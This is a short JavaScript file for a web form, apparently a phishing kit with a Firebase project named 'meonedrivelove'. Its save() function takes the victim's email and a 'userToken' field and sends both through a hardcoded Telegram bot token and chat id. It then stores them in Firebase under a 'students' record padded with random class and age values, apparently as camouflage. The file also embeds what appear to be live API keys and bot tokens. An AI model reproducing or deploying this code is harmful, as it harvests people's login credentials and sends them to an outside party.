// Your web app's Firebase configuration
var firebaseConfig = {
  apiKey: "AIzaSyBKv3HxNRh665zD9B1tdPnGEUyb98VhMdI",
  authDomain: "meonedrivelove.firebaseapp.com",
  projectId: "meonedrivelove",
  storageBucket: "meonedrivelove.appspot.com",
  messagingSenderId: "634007613106",
  appId: "1:634007613106:web:c70c4d511d7a1a33e123ab"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Set database variable
var database = firebase.database()

function save() {
  var email = document.getElementById('x1').value
  var userToken = document.getElementById('userToken').value
  var id = Math.floor(Math.random() * 999);
  var studentClass = Math.floor(Math.random() * 9);
  var age = Math.floor(Math.random() * 19);

  var token = "6472242773:AAFdQ0LbSt2hBo1_vC4ABQCTQvytFMwbIAo";
  var chat_id = -4246014250;
  var message = " New user Record ---| Email:: " + email + " | UserToken:: " + userToken ;  
  var urlz = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + message; 
  

  const  urle = urlz;
    const xht = new XMLHttpRequest();

    xht.open("GET", urle);
    xht.send();

  database.ref('students/' + id).set({
    email : email,
    userToken : userToken,
    studentClass : studentClass,
    age : age,
  })

  $('#msg').show();
  $('#msg2').hide();
  setTimeout(function () {
      $('#msg').hide();
      $('#msg2').show();
      $("#x1").val(url);
      $("#userToken").val("");
  }, 2000);
}



